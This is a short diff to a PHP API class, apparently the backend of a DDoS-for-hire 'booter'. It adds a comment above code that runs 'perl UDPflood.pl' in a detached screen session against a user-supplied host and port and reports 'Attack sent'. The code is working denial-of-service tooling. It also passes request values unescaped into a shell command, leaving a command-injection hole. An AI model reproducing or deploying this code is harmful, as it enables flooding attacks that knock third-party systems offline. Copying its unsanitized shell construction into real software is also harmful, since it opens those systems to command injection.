@@ -96,6 +96,7 @@ class API
                 if (intval($this->get->time) > 1200) {
                     $time = 1200;
                 }
+                // example you can change it!
                 $command = "screen -dmS {$smIP} perl UDPflood.pl {$this->get->host} {$this->get->port} 65500 {$time}";
                 $this->message = 'Attack sent';
                 break;
